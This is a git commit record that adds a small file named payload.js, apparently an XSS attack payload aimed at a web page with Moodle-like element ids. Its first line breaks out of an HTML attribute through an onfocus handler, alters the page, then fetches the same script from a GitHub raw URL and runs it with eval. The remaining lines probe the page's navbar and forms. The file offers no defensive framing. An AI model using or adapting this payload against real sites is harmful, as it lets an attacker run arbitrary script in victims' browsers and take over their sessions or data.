9166af97697435d36a3833293f418263059f07db
War-on <101604756+War-on@users.noreply.github.com>
2025-12-16 01:50:07 -0300

    Add files via upload

---
+++ payload.js
@@ -0,0 +1,5 @@
+// "autofocus="true"onfocus="document.evaluate('//*[@id=\&quot;region-main\&quot;]/div/div/div/h2',document,null,XPathResult.FIRST_ORDERED_NODE_TYPE,null).singleNodeValue.textContent='';document.querySelector('.no-link').remove();fetch('https://raw.githubusercontent.com/War-on/Frmt/refs/heads/main/payload.js').then(r => r.text()).then(c => eval(c)); ""
+
+
+var Primeira_Busca = `//*[@id="page-navbar"]/nav/ol/li[3]/a`;
+alert(document.getElementsByTagName('form')[0]);
